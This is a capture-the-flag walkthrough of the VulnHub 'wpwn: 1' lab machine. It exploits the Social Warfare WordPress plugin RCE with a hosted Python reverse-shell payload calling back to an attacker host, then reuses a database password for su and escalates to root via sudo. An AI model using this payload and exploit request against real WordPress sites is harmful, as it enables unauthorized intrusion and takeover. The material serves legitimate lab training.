# VulnHub > wpwn: 1

* Name: wpwn: 1
* Date release: 18 Aug 2020
* Author: 0xatom
* Series: wpwn

**Description**

This is an easy box.

It's vmware based, i dont know if it works on VB you can test it if you want.

There are 2 flags under `/home/$user/user.txt` & `/root/root.txt`.

No stupid ctfy/guessy stuff.

Remember: your goal is to read the root flag, not just to take a root shell. Feel free to DM me on discord for any tip/hint.

Happy pwning! :D

# User flag

## Services enumeration

Nmap discovers 2 services:

~~~
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59:b7:db:e0:ba:63:76:af:d0:20:03:11:e1:3c:0e:34 (RSA)
|   256 2e:20:56:75:84:ca:35:ce:e3:6a:21:32:1f:e7:f5:9a (ECDSA)
|_  256 0d:02:83:8b:1a:1c:ec:0f:ae:74:cc:7b:da:12:89:9e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web enumeration

There is nothing interesting at the root of the website:

~~~
kali@kali:/data/wpwnvm$ curl http://wpwnvm.box/
wpwn box
<br>
remember: your goal is not just to get root shell, your goal is to read root.txt is part of the challenge. Have fun! :D
~~~

There is a `robots.txt` file but it's a rabbit hole (the `/secret` location doesn't exist):

~~~
kali@kali:/data/wpwnvm$ curl http://wpwnvm.box/robots.txt
/secret
# haha, just kidding. Focus on real stuff ma boi
~~~

Gobuster reveals a Wordpress installation:

~~~
kali@kali:~$ gobuster dir -u http://wpwnvm.box/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://wpwnvm.box/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/22 15:33:00 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/wordpress (Status: 301)
===============================================================
2020/09/22 15:33:02 Finished
===============================================================
~~~

## Wordpress

### Static IP

Browsing the `/wordpress` directory reveals that the site expects to be called from a static IP (`192.168.1.12`). I forced the static IP for the VM's mac address on my router.

### wpscan

Wpscan reveals that the `social-warfare` plugin is vulnerable to Remote Code Execution:

~~~
kali@kali:/data/wpwnvm$ wpscan --url http://192.168.1.12/wordpress/ -e vp --api-token <apitoken>
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.1.12/wordpress/ [192.168.1.12]
[+] Started: Tue Sep 22 18:18:30 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.1.12/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://192.168.1.12/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.1.12/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.1.12/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Latest, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.1.12/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://192.168.1.12/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://192.168.1.12/wordpress/wp-content/themes/twentytwenty/
 | Latest Version: 1.5 (up to date)
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://192.168.1.12/wordpress/wp-content/themes/twentytwenty/readme.txt
 | Style URL: http://192.168.1.12/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.1.12/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] social-warfare
 | Location: http://192.168.1.12/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2020-08-18T17:05:00.000Z
 | [!] The version is out of date, the latest version is 4.1.0
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Comment (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Social Warfare <= 3.5.2 - Unauthenticated Arbitrary Settings Update
 |     Fixed in: 3.5.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9238
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9978
 |      - https://wordpress.org/support/topic/malware-into-new-update/
 |      - https://www.wordfence.com/blog/2019/03/unpatched-zero-day-vulnerability-in-social-warfare-plugin-exploited-in-the-wild/
 |      - https://threatpost.com/wordpress-plugin-removed-after-zero-day-discovered/143051/
 |      - https://twitter.com/warfareplugins/status/1108826025188909057
 |      - https://www.wordfence.com/blog/2019/03/recent-social-warfare-vulnerability-allowed-remote-code-execution/
 |
 | [!] Title: Social Warfare <= 3.5.2 - Unauthenticated Remote Code Execution (RCE)
 |     Fixed in: 3.5.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9259
 |      - https://www.webarxsecurity.com/social-warfare-vulnerability/
 |
 | Version: 3.5.2 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://192.168.1.12/wordpress/, Match: 'Social Warfare v3.5.2'
 | Confirmed By:
 |  Query Parameter (Passive Detection)
 |   - http://192.168.1.12/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.2
 |   - http://192.168.1.12/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.2
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.1.12/wordpress/wp-content/plugins/social-warfare/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.1.12/wordpress/wp-content/plugins/social-warfare/readme.txt

[+] WPVulnDB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 47

[+] Finished: Tue Sep 22 18:18:34 2020
[+] Requests Done: 7
[+] Cached Requests: 34
[+] Data Sent: 1.528 KB
[+] Data Received: 7.008 KB
[+] Memory used: 173.074 MB
[+] Elapsed time: 00:00:03
~~~

Here is a link (https://wpvulndb.com/vulnerabilities/9259) that details the vulnerability.

## Reverse shell

Let's exploit the vulnerability.

Start a listener:

~~~
kali@kali:/data/wpwnvm/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
~~~

Prepare a python reverse shell and host it with a python web server:

~~~
kali@kali:/data/wpwnvm/files$ cat payload.txt 
<pre>system('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.9",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);\'')</pre>
kali@kali:/data/wpwnvm/files$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.1.12 - - [22/Sep/2020 18:34:58] "GET /payload.txt?swp_debug=get_user_options HTTP/1.0" 200 -
~~~

Now call the following URL:

~~~
kali@kali:/data/wpwnvm/files$ curl "http://192.168.1.12/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.1.9:8000/payload.txt"
~~~

We now have a reverse shell:

~~~
kali@kali:/data/wpwnvm/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.1.9] from (UNKNOWN) [192.168.1.12] 44542
bash: cannot set terminal process group (487): Inappropriate ioctl for device
bash: no job control in this shell
www-data@wpwn:/var/www/html/wordpress/wp-admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

## User flag

The user flag is in `/home/takis/user.txt`:

~~~
www-data@wpwn:/var/www/html/wordpress$ ls -la /home
ls -la /home
total 12
drwxr-xr-x  3 root  root  4096 Aug 17 18:50 .
drwxr-xr-x 18 root  root  4096 Aug 17 18:46 ..
drwxr-xr-x  3 takis takis 4096 Aug 17 19:44 takis
www-data@wpwn:/var/www/html/wordpress$ cd /home/takis
cd /home/takis
www-data@wpwn:/home/takis$ ls -la
ls -la
total 32
drwxr-xr-x 3 takis takis 4096 Aug 17 19:44 .
drwxr-xr-x 3 root  root  4096 Aug 17 18:50 ..
-rw------- 1 takis takis   59 Aug 17 20:31 .bash_history
-rw-r--r-- 1 takis takis  220 Aug 17 18:50 .bash_logout
-rw-r--r-- 1 takis takis 3526 Aug 17 18:50 .bashrc
drwxr-xr-x 3 takis takis 4096 Aug 17 19:44 .local
-rw-r--r-- 1 takis takis  807 Aug 17 18:50 .profile
-rw-r--r-- 1 root  root    33 Aug 17 19:00 user.txt
www-data@wpwn:/home/takis$ cat user.txt
cat user.txt
04ebbbf5e6e298e8fab6deb92deb3a7f
~~~

# Root flag

## Lateral move (www-data -> takis)

Checking the Wordpress configuration file (`/var/www/html/wordpress/wp-config.php`) reveals the password to connect to the database. Below is the interesting extract:

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress_db' );

/** MySQL database username */
define( 'DB_USER', 'wp_user' );

/** MySQL database password */
define( 'DB_PASSWORD', 'R3&]vzhHmMn9,:-5' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

It turns our that takis' password is the same as the database password. Let's switch to `takis`:

~~~
www-data@wpwn:/var/www/html/wordpress/wp-admin$ python3 -c "import pty;pty.spawn('/bin/bash')"
<min$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@wpwn:/var/www/html/wordpress/wp-admin$ su takis
su takis
Password: R3&]vzhHmMn9,:-5

takis@wpwn:/var/www/html/wordpress/wp-admin$ id
id
uid=1000(takis) gid=1000(takis) groups=1000(takis),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
~~~

At this stage, it may be a good idea to connect over SSH directly to free up the reverse shell.

## Priv esc

Checking `takis`' privileges reveals that he can elevate to `root` via `sudo`:

~~~
takis@wpwn:~$ sudo -l
Matching Defaults entries for takis on wpwn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User takis may run the following commands on wpwn:
    (ALL) NOPASSWD: ALL
takis@wpwn:~$ sudo -s
root@wpwn:/home/takis# id
uid=0(root) gid=0(root) groups=0(root)
~~~

## Root flag

The `/root/root.txt` file doesn't contain the root flag but gives a hint:

~~~
root@wpwn:/home/takis# cd /root/
root@wpwn:~# ls -la
total 32
drwx------  3 root root 4096 Aug 17 20:30 .
drwxr-xr-x 18 root root 4096 Aug 17 18:46 ..
-rw-------  1 root root 1812 Aug 17 20:31 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Aug 17 18:58 .local
-rw-------  1 root root  215 Aug 17 19:22 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   87 Aug 17 19:01 root.txt
root@wpwn:~# cat root.txt
damn, i really don't know where i left the root.txt flag, take a look into my USB plz.
~~~

Searching for files and directories containing the `USB` string reveals a potential location that would contain the root flag:

~~~
root@wpwn:~# find / -name "*USB*" 2>/dev/null
/dev/input/by-id/usb-VMware_VMware_Virtual_USB_Mouse-mouse
/dev/input/by-id/usb-VMware_VMware_Virtual_USB_Mouse-event-mouse
/usr/games/USB <------------- may be interesting!
/run/udev/links/\x2finput\x2fby-id\x2fusb-VMware_VMware_Virtual_USB_Mouse-mouse
/run/udev/links/\x2finput\x2fby-id\x2fusb-VMware_VMware_Virtual_USB_Mouse-event-mouse
~~~

Indeed, the root flag was in `/usr/games/USB/root`:

~~~
root@wpwn:~# cd /usr/games/USB/
root@wpwn:/usr/games/USB# ll
total 12
drwxr-xr-x 2 root root 4096 Aug 17 20:24 .
drwxr-xr-x 3 root root 4096 Aug 17 20:24 ..
-rw-r----- 1 root root   46 Aug 17 20:24 root
root@wpwn:/usr/games/USB# cat root 
19905b045801f04e96d803659ad987ce

-gamer over
~~~
